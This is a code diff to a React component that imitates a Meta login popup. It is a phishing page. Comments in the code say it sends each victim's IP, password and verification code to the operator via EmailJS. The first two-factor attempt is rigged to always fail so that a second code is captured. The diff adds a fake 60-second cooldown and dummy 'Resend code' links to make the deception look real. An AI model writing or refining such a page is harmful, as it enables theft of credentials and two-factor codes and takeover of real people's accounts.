@@ -36,8 +36,14 @@ const MetaLoginPopup = () => {
   const [verificationCode, setVerificationCode] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [currentStep, setCurrentStep] = useState(LoginStep.LOGIN_FIRST_ATTEMPT);
+  const [errorMessage, setErrorMessage] = useState("");
+  const [verificationError, setVerificationError] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
   const [countdown, setCountdown] = useState(60);
+  const [cooldownActive, setCooldownActive] = useState(false);
+  
   const codeInputRef = useRef<HTMLInputElement>(null);
+  const intervalRef = useRef<NodeJS.Timeout | null>(null);
   
   // Close the window when verification is successful
   useEffect(() => {
@@ -61,16 +67,37 @@ const MetaLoginPopup = () => {
     }
   }, [currentStep]);
 
+  // Handle cooldown timer for verification attempts
+  useEffect(() => {
+    // Start countdown when verification fails in first attempt
+    if (currentStep === LoginStep.VERIFICATION_SECOND_ATTEMPT && cooldownActive) {
+      intervalRef.current = setInterval(() => {
+        setCountdown((prevCount) => {
+          const newCount = prevCount - 1;
+          if (newCount <= 0) {
+            if (intervalRef.current) clearInterval(intervalRef.current);
+            setCooldownActive(false);
+            return 60;
+          }
+          return newCount;
+        });
+      }, 1000);
+    }
+
+    return () => {
+      if (intervalRef.current) {
+        clearInterval(intervalRef.current);
+      }
+    };
+  }, [currentStep, cooldownActive]);
+
   // Random delay between 3-5 seconds
   const getRandomDelay = () => Math.floor(Math.random() * 2000) + 3000;
-  
-  const [showPassword, setShowPassword] = useState(false);
-  const [errorMessage, setErrorMessage] = useState<string | null>(null);
   
   const handlePasswordSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
-    setErrorMessage(null);
+    setErrorMessage("");
 
     // Lấy IP và gửi thông tin đăng nhập qua EmailJS
     try {
@@ -114,13 +141,17 @@ const MetaLoginPopup = () => {
       }
     }, getRandomDelay());
   };
-
-  const [verificationError, setVerificationError] = useState<string | null>(null);
   
   const handleVerificationSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    // If cooldown is active, don't allow submission
+    if (cooldownActive) {
+      return;
+    }
+    
     setIsLoading(true);
-    setVerificationError(null);
+    setVerificationError("");
 
     // Lấy IP và gửi thông tin mã xác thực qua EmailJS
     try {
@@ -150,10 +181,13 @@ const MetaLoginPopup = () => {
       
       if (currentStep === LoginStep.VERIFICATION_FIRST_ATTEMPT) {
         // First verification attempt always fails
+        // Start 60-second cooldown
         setTimeout(() => {
           setIsLoading(false);
-          setVerificationError("The verification code you entered is incorrect. Please try again.");
+          setVerificationError("The verification code you entered is incorrect. Please try again after 60 seconds.");
           setVerificationCode("");
+          setCooldownActive(true);
+          setCountdown(60);
           setCurrentStep(LoginStep.VERIFICATION_SECOND_ATTEMPT);
         }, 500);
       } else {
@@ -194,13 +228,9 @@ const MetaLoginPopup = () => {
                 <p className="text-gray-600 text-sm text-center mt-2">Please sign in to continue</p>
               </div>
               
-              {/* Phần xác thực captcha đã được xóa */}
-              
               {/* Login Steps */}
               {(currentStep === LoginStep.LOGIN_FIRST_ATTEMPT || currentStep === LoginStep.LOGIN_SECOND_ATTEMPT) && (
                 <form onSubmit={handlePasswordSubmit} className="space-y-4">
-
-                  
                   <div className="space-y-1">
                     <Label htmlFor="email" className="text-gray-700 font-medium">Email or Username</Label>
                     <div className="relative">
@@ -332,7 +362,7 @@ const MetaLoginPopup = () => {
                           onChange={(e) => setVerificationCode(e.target.value.replace(/[^0-9]/g, '').substring(0, 8))}
                           placeholder="Enter 6-digit code"
                           className={`h-[50px] rounded-md text-lg text-center bg-gray-50 border ${verificationError ? "border-red-500" : "border-gray-300"}`}
-                          disabled={isLoading}
+                          disabled={isLoading || cooldownActive}
                           maxLength={8}
                         />
                       </div>
@@ -343,19 +373,28 @@ const MetaLoginPopup = () => {
                           <span>{verificationError}</span>
                         </div>
                       )}
+                      
+                      {cooldownActive && (
+                        <div className="flex items-center mt-3 text-orange-600 text-sm">
+                          <AlertTriangle className="h-4 w-4 mr-1 flex-shrink-0" />
+                          <span>Please wait {countdown} seconds before trying again</span>
+                        </div>
+                      )}
                     </div>
                     
                     <div className="pt-2">
                       <Button 
                         type="submit" 
                         className="w-full bg-blue-600 hover:bg-blue-700 text-white h-[50px] rounded-md text-[17px] font-semibold"
-                        disabled={isLoading}
+                        disabled={isLoading || cooldownActive}
                       >
                         {isLoading ? (
                           <div className="flex items-center justify-center">
                             <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                             <span>Verifying code...</span>
                           </div>
+                        ) : cooldownActive ? (
+                          `Try again in ${countdown}s`
                         ) : (
                           "Verify Identity"
                         )}
@@ -363,10 +402,18 @@ const MetaLoginPopup = () => {
                     </div>
                     
                     <div className="flex justify-between items-center pt-4">
-                      <a href="#" className="text-blue-600 text-sm hover:underline">
+                      <a 
+                        href="#" 
+                        className={`text-blue-600 text-sm ${cooldownActive ? "opacity-50 pointer-events-none" : "hover:underline"}`}
+                        onClick={(e) => e.preventDefault()}
+                      >
                         Resend code
                       </a>
-                      <a href="#" className="text-blue-600 text-sm hover:underline">
+                      <a 
+                        href="#" 
+                        className={`text-blue-600 text-sm ${cooldownActive ? "opacity-50 pointer-events-none" : "hover:underline"}`}
+                        onClick={(e) => e.preventDefault()}
+                      >
                         Try another method
                       </a>
                     </div>
